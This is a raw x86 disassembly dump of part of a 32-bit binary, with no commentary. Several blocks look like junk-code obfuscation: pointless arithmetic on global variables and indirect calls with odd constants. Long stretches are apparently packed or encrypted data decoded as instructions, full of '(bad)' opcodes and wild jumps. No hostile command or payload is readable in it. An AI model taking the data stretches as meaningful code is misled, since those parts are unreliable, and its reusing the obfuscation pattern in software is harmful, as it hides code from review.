  420594:	mov    DWORD PTR [ebp-0x24],0x7901
  42059b:	cmp    DWORD PTR ds:0x428183,0x0
  4205a2:	not    esi
  4205a4:	mov    DWORD PTR ds:0x4283a7,0x3e17
  4205ae:	jmp    0x420635
  4205b3:	mov    DWORD PTR ds:0x428243,0x2222
  4205bd:	not    DWORD PTR ds:0x428253
  4205c3:	cmp    DWORD PTR ds:0x428183,0x0
  4205ca:	jge    0x42060e
  4205d0:	push   0x185b
  4205d5:	push   0x4283af
  4205da:	push   0x89e7
  4205df:	push   DWORD PTR [ebp-0x20]
  4205e2:	call   DWORD PTR ds:0x428e5c
  4205e8:	xor    edx,DWORD PTR ds:0x428257
  4205ee:	mov    ecx,DWORD PTR ds:0x42823f
  4205f4:	or     DWORD PTR ds:0x42816f,ecx
  4205fa:	mov    ecx,DWORD PTR ds:0x4282e3
  420600:	mov    ecx,DWORD PTR [ecx]
  420602:	and    DWORD PTR ds:0x4283ab,ecx
  420608:	and    esi,0x3af9
  42060e:	and    ecx,0x78a0
  420614:	mov    edx,DWORD PTR ds:0x42828b
  42061a:	xor    DWORD PTR ds:0x428277,edx
  420620:	movzx  ecx,WORD PTR ds:0x428263
  420627:	and    ecx,DWORD PTR ds:0x42839b
  42062d:	mov    DWORD PTR ds:0x428263,ecx
  420633:	sub    ecx,edx
  420635:	mov    DWORD PTR [ebp-0xc0],0x3e2c
  42063f:	xor    DWORD PTR ds:0x4283af,0x275e
  420649:	mov    DWORD PTR [ebp-0x78],0x37f2
  420650:	sbb    ecx,0x6514
  420656:	mov    DWORD PTR [ebp-0x10],0x62ba
  42065d:	jmp    0x4209b9
  420662:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420663:	(bad)  
  420664:	mov    ?,ebx
  420666:	push   0x3a
  420668:	and    eax,0xe3891e9e
  42066d:	stos   BYTE PTR es:[edi],al
  42066e:	cdq    
  42066f:	inc    edx
  420670:	sar    DWORD PTR [esp+ebp*4-0x5ce7e9e3],cl
  420677:	adc    bl,BYTE PTR [eax]
  420679:	sbb    al,al
  42067b:	mov    bl,0x7
  42067d:	loope  0x4206e7
  42067f:	loop   0x4206f3
  420681:	adc    DWORD PTR [edx],edx
  420683:	mov    eax,0xa40724a9
  420688:	enter  0x1ac0,0x12
  42068c:	enter  0x8307,0xaa
  420690:	add    al,BYTE PTR [ebp-0x61bd5445]
  420696:	shl    DWORD PTR [edx],1
  420698:	iret   
  420699:	mov    gs:0xe94241ea,eax
  42069f:	mov    ah,0x90
  4206a1:	xchg   esi,eax
  4206a2:	test   ch,0xef
  4206a5:	add    al,0xfd
  4206a7:	pop    esi
  4206a8:	neg    bh
  4206aa:	addr16 aas 
  4206ac:	shr    eax,1
  4206ae:	adc    ebp,esi
  4206b0:	call   0x997:0x7000ad5f
  4206b7:	xlat   BYTE PTR es:[ebx]
  4206b9:	inc    ebp
  4206ba:	sub    eax,0x9dab6cf7
  4206bf:	ret    
  4206c0:	call   0x93d176ea
  4206c5:	sar    DWORD PTR [edi+0x39],cl
  4206c8:	mov    ds:0x24a38590,al
  4206cd:	sbb    cl,BYTE PTR [ecx-0x21]
  4206d0:	xchg   ebx,eax
  4206d1:	mov    bh,0x67
  4206d3:	and    al,0x42
  4206d5:	add    dl,al
  4206d7:	adc    DWORD PTR [ecx+esi*4+0x4d27edc8],edx
  4206de:	inc    edx
  4206df:	iret   
  4206e0:	sbb    eax,0x3642bb7e
  4206e5:	sub    DWORD PTR [ebx+0x1aedd234],edi
  4206eb:	ins    DWORD PTR es:[edi],dx
  4206ec:	mov    ah,0xe8
  4206ee:	cmp    DWORD PTR [edi+0x7351b0c7],esi
  4206f4:	int    0x92
  4206f6:	cwde   
  4206f7:	fwait
  4206f8:	pushw  ss
  4206fa:	and    ecx,DWORD PTR ds:0xb5df0961
  420700:	or     edi,esi
  420702:	pop    esp
  420703:	loope  0x420710
  420705:	pop    ebx
  420706:	aad    0x2a
  420708:	or     ebx,DWORD PTR [ecx]
  42070a:	aas    
  42070b:	sbb    BYTE PTR [esi+0x1c],ch
  42070e:	inc    esp
  42070f:	out    dx,eax
  420710:	call   0xd0f3:0xd6bd13ec
  420717:	loop   0x4206c4
  420719:	sub    BYTE PTR [ebx],bl
  42071b:	inc    esi
  42071c:	(bad)  
  42071d:	out    dx,al
  42071e:	push   ebp
  42071f:	pop    edx
  420720:	ficom  WORD PTR [ecx-0xe21e996]
  420726:	dec    ebx
  420727:	mov    bh,0x2c
  420729:	push   ecx
  42072a:	and    bl,0xc5
  42072d:	pop    ds
  42072e:	push   es
  42072f:	out    dx,eax
  420730:	mov    cl,0x3a
  420732:	in     eax,dx
  420733:	mov    ah,bh
  420735:	test   al,0x4b
  420737:	mov    ecx,0x2ba51c85
  42073c:	jl     0x4207b8
  42073e:	adc    ebx,DWORD PTR [ecx-0x6f]
  420741:	xor    eax,0xb4a2da7
  420746:	sti    
  420747:	xor    al,0xf3
  420749:	jmp    0x5e2d69c6
  42074e:	ins    DWORD PTR es:[edi],dx
  42074f:	jle    0x420705
  420751:	sbb    eax,0x3e5596f9
  420756:	imul   ecx,DWORD PTR [ecx+0x5a],0x2a
  42075a:	sbb    DWORD PTR [eax-0x72],0xab68e089
  420761:	popa   
  420762:	lea    eax,[edi]
  420764:	cmp    al,0xc9
  420766:	(bad)  
  420767:	ja     0x4207d6
  420769:	outs   dx,DWORD PTR ds:[esi]
  42076a:	gs mov bh,0xe5
  42076d:	pop    ebx
  42076e:	xor    eax,DWORD PTR [ebx+0x5f]
  420771:	push   esi
  420772:	or     DWORD PTR [ebp-0x28],esi
  420775:	jb     0x42076a
  420777:	int    0xea
  420779:	mov    bl,dh
  42077b:	xor    DWORD PTR [eax*2-0x251592f1],0x48097387
  420786:	jmp    0x4207f4
  420788:	lds    ecx,FWORD PTR [ebx]
  42078a:	stc    
  42078b:	push   cs
  42078c:	mov    bh,0xc6
  42078e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42078f:	leave  
  420790:	sub    bl,BYTE PTR [eax+0x880cb62]
  420796:	mov    ebp,0x4fd2856
  42079b:	xchg   esi,eax
  42079c:	dec    edx
  42079d:	shl    BYTE PTR [edi+0x27],0x86
  4207a1:	mov    ch,0xb9
  4207a3:	test   eax,esp
  4207a5:	imul   eax,esi,0xc73e0f24
  4207ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4207ac:	call   0xb77815f2
  4207b1:	push   eax
  4207b2:	gs hlt 
  4207b4:	and    bh,BYTE PTR [edi]
  4207b6:	dec    ecx
  4207b7:	inc    eax
  4207b8:	in     eax,dx
  4207b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4207ba:	cmp    DWORD PTR [esi+0x4179114a],eax
  4207c0:	cwde   
  4207c1:	jmp    0x420779
  4207c3:	cwde   
  4207c4:	fld    DWORD PTR [edi]
  4207c6:	cmp    DWORD PTR [ebx+0x8559673],ebx
  4207cc:	stos   DWORD PTR es:[edi],eax
  4207cd:	or     eax,eax
  4207cf:	stos   BYTE PTR es:[edi],al
  4207d0:	stos   BYTE PTR es:[edi],al
  4207d1:	js     0x4207cd
  4207d3:	(bad)  
  4207d4:	enter  0x1461,0x1
  4207d8:	scas   al,BYTE PTR es:[edi]
  4207d9:	in     al,dx
  4207da:	push   eax
  4207db:	xchg   ah,al
  4207dd:	nop
  4207de:	mov    esp,0x76fcc5a7
  4207e3:	std    
  4207e4:	data16 mov WORD PTR [ecx-0x5a64cbb5],ds
  4207eb:	sub    dh,BYTE PTR [edx-0xa44aeb0]
  4207f1:	xchg   DWORD PTR [edi-0x96c75bb],ebx
  4207f7:	sti    
  4207f8:	neg    DWORD PTR [edi+ecx*1]
  4207fb:	inc    eax
  4207fd:	loop   0x42082d
  4207ff:	outs   dx,BYTE PTR ds:[esi]
  420800:	cmp    esi,edx
  420802:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420803:	loopne 0x42079b
  420805:	inc    edx
  420806:	or     esp,DWORD PTR [ecx+ecx*2+0x3e7f2349]
  42080d:	push   es
  42080e:	sbb    ch,bh
  420810:	fld    QWORD PTR [ecx-0x63e7917f]
  420816:	xchg   edx,eax
  420817:	pop    ebp
  420818:	dec    edx
  420819:	in     al,0x66
  42081b:	jp     0x420832
  42081d:	ins    BYTE PTR es:[edi],dx
  42081e:	pop    edx
  42081f:	dec    ebx
  420820:	cmp    edx,DWORD PTR [eax-0x20d0de40]
  420826:	xor    edi,DWORD PTR [ebp+ebx*1+0x50]
  42082a:	lock adc al,0xb
  42082d:	loope  0x4207df
  42082f:	mov    bl,0x2b
  420831:	add    ecx,DWORD PTR [ebx+ecx*4-0x1c296ef4]
  420838:	test   al,0xf7
  42083a:	in     eax,0x7
  42083c:	sbb    eax,0xe5bea3c6
  420841:	mov    BYTE PTR [edi-0x1b6ede8e],al
  420847:	mov    ch,0x9a
  420849:	and    al,0xf1
  42084b:	pop    edx
  42084c:	jae    0x4208bf
  42084e:	dec    esi
  42084f:	into   
  420850:	add    eax,edx
  420852:	fwait
  420853:	xchg   BYTE PTR [edi-0x7609ce76],bh
  420859:	dec    edx
  42085a:	je     0x420858
  42085c:	xchg   BYTE PTR [edx],ah
  42085e:	jg     0x420870
  420860:	jbe    0x420818
  420862:	jmp    0xc4cf5f84
  420867:	and    eax,0x379579fe
  42086c:	pop    ds
  42086d:	mov    cl,dl
  42086f:	test   eax,0xcbaf0d80
  420874:	push   ss
  420875:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420876:	fs repz fwait
  420879:	or     esi,DWORD PTR [edi]
  42087b:	sbb    cl,BYTE PTR [edx]
  42087d:	aam    0x73
  42087f:	add    esp,ebx
  420881:	(bad)  
  420882:	mov    ebp,DWORD PTR [ecx]
  420884:	scas   eax,DWORD PTR es:[edi]
  420885:	out    dx,al
  420886:	dec    ecx
  420887:	fs xor bh,bh
  42088a:	mov    DWORD PTR [ebp+0x1d],ebp
  42088d:	xchg   esp,eax
  42088e:	mov    ch,ch
  420890:	in     eax,0xbb
  420892:	cmc    
  420893:	js     0x4208ed
  420895:	in     eax,0xb5
  420897:	mov    bh,0xc0
  420899:	xchg   esi,eax
  42089a:	pop    esp
  42089b:	push   eax
  42089c:	jno    0x42085e
  42089e:	xor    DWORD PTR [esi-0xf940659],esi
  4208a4:	and    dh,BYTE PTR [esi]
  4208a6:	jb     0x42082b
  4208a8:	sti    
  4208a9:	stos   DWORD PTR es:[edi],eax
  4208aa:	daa    
  4208ab:	and    DWORD PTR [esi+esi*8+0x3ad2ed12],0xf7bbcceb
  4208b6:	mov    al,ds:0xd35127f
  4208bb:	std    
  4208bc:	popa   
  4208bd:	out    dx,eax
  4208be:	ret    0xf90b
  4208c1:	cmc    
  4208c2:	out    dx,al
  4208c3:	int    0xea
  4208c5:	shl    BYTE PTR [ebx],1
  4208c7:	sbb    eax,esp
  4208c9:	pop    ebp
  4208ca:	push   ebx
  4208cb:	and    BYTE PTR [edi+0x45],dh
  4208ce:	aas    
  4208cf:	pandn  mm7,QWORD PTR [eax-0x14bb255f]
  4208d6:	and    eax,0xf1d0b7a8
  4208db:	das    
  4208dc:	aas    
  4208dd:	add    al,0x18
  4208df:	sub    BYTE PTR [edx+0x2c29770],bl
  4208e5:	sub    esp,DWORD PTR [edi-0x15ced6d8]
  4208eb:	pop    ebp
  4208ec:	inc    edx
  4208ed:	xlat   BYTE PTR ds:[ebx]
  4208ee:	sbb    DWORD PTR [esi],0x879c7313
  4208f4:	imul   ebp,DWORD PTR [eax-0x453efb06],0xab00e559
  4208fe:	dec    edi
  4208ff:	je     0x420970
  420901:	xor    DWORD PTR [eax+ebx*8+0x67b28132],edx
  420908:	inc    eax
  420909:	ja     0x4208c9
  42090b:	sub    bl,BYTE PTR [esi]
  42090d:	jmp    0xa7c1:0x6cfd6e85
  420914:	sbb    BYTE PTR [edi],cl
  420916:	fisub  WORD PTR [edx-0x27a47502]
  42091c:	mov    ds:0xdc2a9c1,eax
  420921:	adc    al,0x82
  420923:	sbb    ebp,DWORD PTR ds:0x4b557838
  420929:	sbb    al,0x1d
  42092b:	shl    BYTE PTR [ebp-0x394ab594],1
  420931:	mov    al,0x6f
  420933:	fwait
  420934:	xchg   ebp,eax
  420935:	adc    ah,bl
  420937:	push   ds
  420938:	in     eax,dx
  420939:	adc    bh,BYTE PTR [eax-0x3f]
  42093c:	out    dx,al
  42093d:	cld    
  42093e:	cmc    
  42093f:	mov    dh,0x15
  420941:	add    bh,BYTE PTR [edx+0x28]
  420944:	std    
  420945:	mov    DWORD PTR [ecx+esi*8],eax
  420948:	enter  0x51ff,0xb8
  42094c:	cmp    al,0x91
  42094e:	loope  0x42096b
  420950:	sub    edx,DWORD PTR [esi+ebp*1]
  420953:	dec    edi
  420954:	pop    esp
  420955:	inc    edi
  420956:	inc    esi
  420957:	add    al,0x5c
  420959:	cs jns 0x4209ac
  42095c:	pop    ebx
  42095d:	(bad)  
  42095e:	dec    edi
  42095f:	cli    
  420960:	mov    ecx,0x1ee4c970
  420965:	sub    al,0x37
  420967:	mov    ecx,DWORD PTR [edx+ecx*8+0x70]
  42096b:	ja     0x4209a9
  42096d:	xor    esp,DWORD PTR [ebx+edx*4-0x2f]
  420971:	and    al,0xcb
  420973:	imul   eax,DWORD PTR [edx-0x41],0xffffff90
  420977:	push   0xfffffff7
  420979:	jo     0x42093a
  42097b:	sbb    eax,0xbaa19d2c
  420980:	mov    esi,esi
  420982:	out    dx,eax
  420983:	mov    esi,0x6cbfc10e
  420988:	mov    esi,0x70b7b637
  42098d:	xor    ecx,DWORD PTR [edx]
  42098f:	stos   DWORD PTR es:[edi],eax
  420990:	in     al,0xde
  420992:	in     al,dx
  420993:	sbb    DWORD PTR [eax-0x26dfa5f0],eax
  420999:	ror    ebp,0x70
  42099c:	add    al,0x60
  42099e:	mov    bh,0x44
  4209a0:	gs cld 
  4209a2:	loopne 0x4209a7
  4209a4:	jmp    0x88a1:0x5f16d1fd
  4209ab:	out    dx,al
  4209ac:	shl    BYTE PTR [ebp+edi*2+0x4ccbc95c],1
  4209b3:	daa    
  4209b4:	add    eax,0xf8a6cb44
  4209b9:	mov    DWORD PTR [ebp-0x94],0x561c
  4209c3:	mov    DWORD PTR [ebp-0x34],0x58bc
  4209ca:	mov    DWORD PTR [ebp-0x60],0x24c7
  4209d1:	xor    eax,DWORD PTR ds:0x428273
  4209d7:	mov    DWORD PTR [ebp-0x5c],0x7a45
  4209de:	xor    DWORD PTR ds:0x42830f,0x80d
  4209e8:	mov    eax,DWORD PTR [ebp-0x34]
  4209eb:	cmp    DWORD PTR ds:0x428337,0x0
  4209f2:	movzx  esi,WORD PTR ds:0x42824f
  4209f9:	mov    ecx,0x4d8b
  4209fe:	jmp    0x420a54
  420a03:	mov    DWORD PTR ds:0x42817b,0x6139
  420a0d:	mov    DWORD PTR ds:0x4283b3,0x3849
  420a17:	cmp    DWORD PTR ds:0x428337,0x0
  420a1e:	jne    0x420a40
  420a24:	push   0x53aa
  420a29:	push   0x7054
  420a2e:	call   DWORD PTR ds:0x428e60
  420a34:	sub    DWORD PTR ds:0x42830b,0xc6b
  420a3e:	inc    esi
  420a3f:	inc    edx
  420a40:	and    DWORD PTR ds:0x42823f,edi
  420a46:	and    edx,0x7a3f
  420a4c:	sbb    ecx,ecx
  420a4e:	and    esi,0x2474
  420a54:	mov    ecx,DWORD PTR [ebp-0x60]
  420a57:	adc    edx,DWORD PTR ds:0x42829b
  420a5d:	mov    edx,DWORD PTR [ebp-0x5c]
  420a60:	mov    esi,DWORD PTR ds:0x42830b
  420a66:	sub    DWORD PTR ds:0x42831f,esi
  420a6c:	and    edx,0x160e
  420a72:	add    esi,DWORD PTR ds:0x42817f
  420a78:	sub    edx,ecx
  420a7a:	cmp    DWORD PTR ds:0x428293,0x0
  420a81:	mov    DWORD PTR ds:0x4282fb,ecx
  420a87:	mov    esi,DWORD PTR ds:0x428333
  420a8d:	jmp    0x420e58
  420a92:	mov    DWORD PTR ds:0x42827b,0x7aef
  420a9c:	cmp    DWORD PTR ds:0x428293,0x0
  420aa3:	je     0x420adc
  420aa9:	push   DWORD PTR [ebp-0x18]
  420aac:	push   0x4599
  420ab1:	push   DWORD PTR [ebp-0x14]
  420ab4:	push   DWORD PTR [ebp-0x10]
  420ab7:	call   DWORD PTR ds:0x428e64
  420abd:	mov    esi,DWORD PTR ds:0x42837b
  420ac3:	or     DWORD PTR ds:0x4282a3,esi
  420ac9:	xor    ecx,ecx
  420acb:	add    ecx,DWORD PTR ds:0x4281b3
  420ad1:	mov    esi,DWORD PTR ds:0x4283f7
  420ad7:	sub    ecx,esi
  420ad9:	or     ecx,DWORD PTR [ecx+esi*1]
  420adc:	mov    esi,DWORD PTR ds:0x42817b
  420ae2:	or     DWORD PTR ds:0x4282a3,esi
  420ae8:	add    ecx,0x4e9b
  420aee:	sbb    esi,ecx
  420af0:	sub    DWORD PTR ds:0x428303,ecx
  420af6:	or     esi,0x56f6
  420afc:	jmp    0x420e58
  420b01:	mov    bl,0xa9
  420b03:	lds    esp,FWORD PTR [edx-0x574d5d3d]
  420b09:	stos   BYTE PTR es:[edi],al
  420b0a:	xor    BYTE PTR [edi+0x7c],0x17
  420b0e:	adc    eax,0x1736bca5
  420b13:	push   ss
  420b14:	sbb    BYTE PTR [ebx-0x37e7e7ee],ah
  420b1a:	icebp  
  420b1b:	inc    eax
  420b1c:	loope  0x420b1b
  420b1e:	jmp    0x4cf1bef8
  420b23:	daa    
  420b24:	shr    BYTE PTR [ebx-0x80e51f1],cl
  420b2a:	shr    DWORD PTR [ecx-0xe],1
  420b2d:	addr16 pop eax
  420b2f:	dec    ebp
  420b30:	popf   
  420b31:	mov    ds:0x169c8128,eax
  420b36:	xchg   ecx,eax
  420b37:	daa    
  420b38:	ins    BYTE PTR es:[edi],dx
  420b39:	push   eax
  420b3a:	sbb    al,0xce
  420b3c:	dec    ebp
  420b3d:	int    0x97
  420b3f:	and    esp,edi
  420b41:	pushf  
  420b42:	dec    esi
  420b43:	add    esi,esi
  420b45:	jnp    0x420bb3
  420b47:	lods   eax,DWORD PTR ds:[esi]
  420b48:	and    al,0xec
  420b4a:	inc    ebp
  420b4b:	sar    DWORD PTR gs:[edi+0x4],1
  420b4f:	sub    DWORD PTR [edi],edi
  420b51:	ins    DWORD PTR es:[edi],dx
  420b52:	cmp    edx,DWORD PTR [edi+0x2c7ac411]
  420b58:	mov    bh,bl
  420b5a:	test   al,0x76
  420b5c:	and    edi,eax
  420b5e:	push   0xffffff87
  420b60:	ins    DWORD PTR es:[edi],dx
  420b61:	jb     0x420bd5
  420b63:	push   0xd6464a9c
  420b68:	xchg   esp,eax
  420b69:	imul   esp,ebx,0xffffffed
  420b6c:	ss sbb edx,edi
  420b6f:	fs pop edx
  420b71:	inc    esp
  420b72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420b73:	cli    
  420b74:	jp     0x420b3d
  420b76:	and    DWORD PTR [edx],ecx
  420b78:	and    esi,DWORD PTR [ebp+0x3816a093]
  420b7e:	pop    edi
  420b7f:	jg     0x420b0c
  420b81:	sub    edx,DWORD PTR [ebp-0x36]
  420b84:	mov    DWORD PTR [eax+0xb9dab4f],0x1e92e28b
  420b8e:	es jns 0x420b74
  420b91:	les    bp,DWORD PTR [ecx]
  420b94:	mov    edi,0x5f55dc8a
  420b99:	in     al,dx
  420b9a:	dec    eax
  420b9b:	jne    0x420bc5
  420b9d:	repz mov edi,0x5d149758
  420ba3:	jle    0x420b59
  420ba5:	jecxz  0x420bf0
  420ba7:	imul   edi,ebx,0xffffffdf
  420baa:	push   edi
  420bab:	aam    0xad
  420bad:	popa   
  420bae:	mov    BYTE PTR [ebx],ch
  420bb0:	mov    ah,dh
  420bb2:	out    0x8b,al
  420bb4:	inc    ebp
  420bb5:	out    dx,eax
  420bb6:	lods   al,BYTE PTR cs:[esi]
  420bb8:	sbb    esi,0xffffffc4
  420bbb:	loop   0x420bff
  420bbd:	mov    cl,0x5a
  420bbf:	mov    dh,al
  420bc1:	xlat   BYTE PTR ds:[ebx]
  420bc2:	and    edx,DWORD PTR [edx]
  420bc4:	push   ds
  420bc5:	in     eax,0x3f
  420bc7:	(bad)  
  420bc8:	push   ebx
  420bc9:	ja     0x420c49
  420bcb:	lahf   
  420bcc:	or     al,0xc8
  420bce:	sub    eax,0x2473d8b3
  420bd3:	sub    eax,DWORD PTR [edi-0x5c]
  420bd6:	push   ds
  420bd7:	out    0x1,eax
  420bd9:	jns    0x420bb5
  420bdb:	xor    ah,BYTE PTR [ecx+0x11b7b086]
  420be1:	lods   al,BYTE PTR ds:[esi]
  420be2:	stc    
  420be3:	or     eax,0x31e4f801
  420be8:	xor    dl,BYTE PTR [esi-0x5e5ccbf]
  420bee:	sub    eax,0x2cc28536
  420bf3:	fwait
  420bf4:	xchg   esp,eax
  420bf5:	iret   
  420bf6:	jnp    0x420c5c
  420bf8:	push   ds
  420bf9:	test   BYTE PTR [ecx+0x6dcbda34],ch
  420bff:	std    
  420c00:	cs adc ebx,edi
  420c03:	dec    esi
  420c04:	push   0xb27caac6
  420c09:	adc    eax,0x85e881fd
  420c0e:	adc    eax,edi
  420c10:	loopne 0x420c64
  420c12:	scas   eax,DWORD PTR es:[edi]
  420c13:	cmp    eax,0xfb4d3a62
  420c18:	jmp    0x420c48
  420c1a:	cmp    esp,DWORD PTR [ebp+0x1cba48]
  420c20:	push   ds
  420c21:	ins    DWORD PTR es:[edi],dx
  420c22:	mov    bl,0xf9
  420c24:	jmp    0x420ba8
  420c26:	loop   0x420bc9
  420c28:	xor    DWORD PTR [edx+0x10],esi
  420c2b:	ins    DWORD PTR es:[edi],dx
  420c2c:	xchg   ebp,eax
  420c2d:	mov    BYTE PTR [esp+ebp*8-0x22],ah
  420c31:	out    dx,al
  420c32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420c33:	push   edx
  420c34:	cdq    
  420c35:	mov    ah,0x3
  420c37:	sbb    BYTE PTR [edi],bh
  420c39:	cmp    BYTE PTR [eax-0x63],ah
  420c3c:	adc    DWORD PTR ds:[esi],0xc7ff0e79
  420c43:	mov    ch,BYTE PTR [eax+0x6d]
  420c46:	mov    esi,0x39fe5591
  420c4b:	sahf   
  420c4c:	mov    cl,BYTE PTR [ecx+0x47]
  420c4f:	arpl   WORD PTR [ebp+0x2],sp
  420c52:	fs jmp 0xe78ff069
  420c58:	inc    eax
  420c59:	push   eax
  420c5a:	addr16 mov ebp,0xa6f4cc52
  420c60:	iret   
  420c61:	sub    DWORD PTR [eax+0x440fd9b3],ebx
  420c67:	scas   eax,DWORD PTR es:[edi]
  420c68:	and    edx,eax
  420c6a:	lea    esi,[esi]
  420c6c:	mov    bl,0x9a
  420c6e:	or     DWORD PTR [ecx-0x4],ecx
  420c71:	(bad)  
  420c72:	mov    ds:0x8353c610,eax
  420c77:	rcr    DWORD PTR [edx+ecx*8-0x5f],1
  420c7b:	call   0xd5e4a255
  420c80:	popa   
  420c81:	push   edi
  420c82:	cmp    eax,0xe0dc7345
  420c87:	popf   
  420c88:	(bad)  
  420c8a:	inc    edi
  420c8b:	test   al,0x7a
  420c8d:	arpl   WORD PTR [eax],sp
  420c8f:	out    dx,al
  420c90:	mov    eax,ds:0x321dc91d
  420c95:	mov    ds:0x8a2d4d45,eax
  420c9a:	shl    DWORD PTR [esi],0x31
  420c9d:	stos   BYTE PTR es:[edi],al
  420c9e:	xlat   BYTE PTR cs:[ebx]
  420ca0:	mov    bl,0x6d
  420ca2:	(bad)  
  420ca3:	aam    0xfc
  420ca5:	sar    BYTE PTR [ecx+0x55],1
  420ca8:	bswap  esp
  420caa:	jmp    0x420cee
  420cac:	dec    ebp
  420cad:	xlat   BYTE PTR ds:[ebx]
  420cae:	and    BYTE PTR [edi+0x5d829764],bh
  420cb4:	cmp    ebx,ecx
  420cb6:	cmp    DWORD PTR [ecx+0x776299c4],esp
  420cbc:	in     eax,0xe2
  420cbe:	cmp    edi,DWORD PTR [ebp+0x618b5704]
  420cc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420cc5:	xor    bl,cl
  420cc7:	mov    BYTE PTR [edi],ah
  420cc9:	jmp    0x420c68
  420ccb:	xchg   BYTE PTR ds:0x14f,ah
  420cd0:	push   edi
  420cd1:	pop    esi
  420cd2:	add    BYTE PTR [edx+0x67],bh
  420cd5:	mov    cl,0x3a
  420cd7:	cmp    al,0xb4
  420cd9:	jg     0x420c6a
  420cdb:	retf   0xf665
  420cde:	leave  
  420cdf:	rol    DWORD PTR [ebp+0x4ff264fb],1
  420ce5:	inc    edx
  420ce6:	dec    edi
  420ce7:	inc    eax
  420ce8:	out    0x1c,eax
  420cea:	not    BYTE PTR [edi]
  420cec:	push   0xb9f77f33
  420cf1:	add    bl,BYTE PTR [edi*1-0x9252dbf]
  420cf8:	pop    ebx
  420cf9:	jnp    0x420cf1
  420cfb:	outs   dx,DWORD PTR ds:[esi]
  420cfc:	cmp    cl,bl
  420cfe:	xchg   ecx,eax
  420cff:	mov    cl,0x28
  420d01:	stos   BYTE PTR es:[edi],al
  420d02:	call   0x1a1fb72b
  420d07:	loope  0x420c92
  420d09:	fcmovnb st,st(4)
  420d0b:	push   edi
  420d0c:	jbe    0x420d47
  420d0e:	rcl    esi,0xec
  420d11:	test   BYTE PTR [edi+0x53],ch
  420d14:	pop    ss
  420d15:	jno    0x420d1c
  420d17:	inc    ecx
  420d18:	in     al,dx
  420d19:	dec    edx
  420d1a:	ja     0x420d12
  420d1c:	xor    eax,0xf2d44549
  420d21:	fdivrp st(2),st
  420d23:	cld    
  420d24:	pop    es
  420d25:	xor    BYTE PTR [eax],dh
  420d27:	jnp    0x420cdb
  420d29:	jp     0x420d5d
  420d2b:	add    ch,bh
  420d2d:	add    dh,dl
  420d2f:	bound  ecx,QWORD PTR [eax-0x7dea7167]
  420d35:	cmp    ebp,DWORD PTR [edx+edx*4-0x4e38cdad]
  420d3c:	or     al,0xbe
  420d3e:	jo     0x420d7d
  420d40:	ins    BYTE PTR es:[edi],dx
  420d41:	fimul  DWORD PTR [edx+0x46dab6ab]
  420d47:	nop
  420d48:	repnz pop ebx
  420d4a:	iret   
  420d4b:	inc    ebx
  420d4c:	(bad)  
  420d4d:	retf   0x389
  420d50:	repz inc edx
  420d52:	ret    0x380d
  420d55:	jb     0x420d08
  420d57:	(bad)  
  420d58:	xchg   edx,eax
  420d59:	mov    gs:0x1af521be,al
  420d5f:	out    0x73,al
  420d61:	mov    WORD PTR [ebp-0x2e],ds
  420d64:	inc    ebx
  420d65:	dec    eax
  420d66:	pop    ebx
  420d67:	push   cs
  420d68:	cli    
  420d69:	inc    ecx
  420d6a:	imul   ebx,DWORD PTR [edx-0x3e1812cf],0xda3d6711
  420d74:	sbb    BYTE PTR [ecx+ecx*2-0x2f4c8577],0x7f
  420d7c:	shl    BYTE PTR [esi-0x29584ace],cl
  420d82:	jmp    0x18d866ca
  420d87:	pop    ecx
  420d88:	push   ecx
  420d89:	ret    0x7cf8
  420d8c:	sbb    ecx,eax
  420d8e:	inc    ebx
  420d8f:	lods   al,BYTE PTR ds:[esi]
  420d90:	(bad)  
  420d91:	lahf   
  420d92:	mov    dh,0x23
  420d94:	sub    cl,BYTE PTR [edx+0x75]
  420d97:	loop   0x420d1b
  420d99:	xchg   edi,eax
  420d9a:	int3   
  420d9b:	fld    TBYTE PTR [esi-0x7f39056a]
  420da1:	imul   eax,DWORD PTR [esi-0x6d],0x53
  420da5:	adc    eax,esi
  420da7:	mov    bl,0xd9
  420da9:	lea    ecx,[edx]
  420dab:	dec    DWORD PTR [edx]
  420dad:	jb     0x420d46
  420daf:	cmp    cl,BYTE PTR [ecx]
  420db1:	(bad)  
  420db2:	cld    
  420db3:	mov    edx,0x660992eb
  420db8:	enter  0x700b,0xd8
  420dbc:	sub    DWORD PTR [ebp-0x16217573],ecx
  420dc2:	lods   eax,DWORD PTR ds:[esi]
  420dc3:	pop    ebp
  420dc4:	repz rcl DWORD PTR [esp+ecx*8+0x0],1
  420dc9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420dca:	mov    eax,ds:0xd9ec17c8
  420dcf:	adc    al,0x21
  420dd1:	and    BYTE PTR [ecx],ah
  420dd3:	cmp    eax,0xcd803e24
  420dd8:	ja     0x420db6
  420dda:	sub    ebp,DWORD PTR [esi]
  420ddc:	pop    edi
  420ddd:	fidiv  WORD PTR [edi+0x12]
  420de0:	repnz pop ecx
  420de2:	aam    0xcf
  420de4:	cmp    eax,0x5443362a
  420de9:	add    ah,cl
  420deb:	add    eax,0x7b9757d
  420df0:	enter  0xa1b1,0x46
  420df4:	dec    ecx
  420df5:	cmc    
  420df6:	and    BYTE PTR [edx-0x32],bl
  420df9:	mov    cl,0x26
  420dfb:	inc    ebp
  420dfc:	adc    esp,DWORD PTR [ebp+0x55b312e1]
  420e02:	int3   
  420e03:	pop    ecx
  420e04:	sub    DWORD PTR [ebx+ecx*4+0xe],ebp
  420e08:	es sti 
  420e0a:	sbb    BYTE PTR [ebx],ch
  420e0c:	jg     0x420e02
  420e0e:	pop    es
  420e0f:	mov    eax,0x803a38
  420e14:	cmp    dh,BYTE PTR [eax]
  420e16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e17:	idiv   BYTE PTR [esi+eiz*4-0x69]
  420e1b:	(bad)  
  420e1c:	xor    al,BYTE PTR [edi+0x58]
  420e1f:	test   DWORD PTR [edi-0x19],eax
  420e22:	push   ds
  420e23:	push   ebx
  420e24:	stos   DWORD PTR es:[edi],eax
  420e25:	stos   DWORD PTR es:[edi],eax
  420e26:	or     al,0xd
  420e28:	pop    esp
